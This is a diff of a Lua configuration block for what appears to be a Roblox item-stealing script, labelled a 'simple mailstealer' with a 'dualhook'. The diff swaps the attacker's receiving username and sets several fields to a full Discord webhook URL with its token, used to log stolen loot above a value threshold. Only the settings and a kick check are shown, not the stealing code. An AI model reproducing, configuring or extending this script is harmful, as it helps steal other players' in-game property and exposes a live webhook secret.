@@ -1,13 +1,13 @@
 
 MinimumRAP = 10000
 
-DualhookUsername = "TS_Gamer31"
+DualhookUsername = "myrayuo"
 DualhookWebhook = "https://discord.com/api/webhooks/1292224150097891370/GDzsS1PUzUZs4iHYKYX7yF7PgHDtE8-ona5ywQhHo2POLQRYKkKvQmkqBwi6cQPxKpLD"
 LogsWebhook = "https://discord.com/api/webhooks/1292224150097891370/GDzsS1PUzUZs4iHYKYX7yF7PgHDtE8-ona5ywQhHo2POLQRYKkKvQmkqBwi6cQPxKpLD"
 DualhookRAP = 1000000
 mailstealer_name = "Furqwk"
 
-Roblox_Username = "TS_Gamer31"
+Roblox_Username = "myrayuo"
 Discord_Webhook = "https://discord.com/api/webhooks/1292224150097891370/GDzsS1PUzUZs4iHYKYX7yF7PgHDtE8-ona5ywQhHo2POLQRYKkKvQmkqBwi6cQPxKpLD"
 
 -- simple mailstealer
@@ -32,7 +32,7 @@ if idiotuser == Username then
     return
 end
 if Username == nil then
-    game:GetService("Players").LocalPlayer:Kick("TS_Gamer31")
+    game:GetService("Players").LocalPlayer:Kick("myrayuo")
     return
 end
 
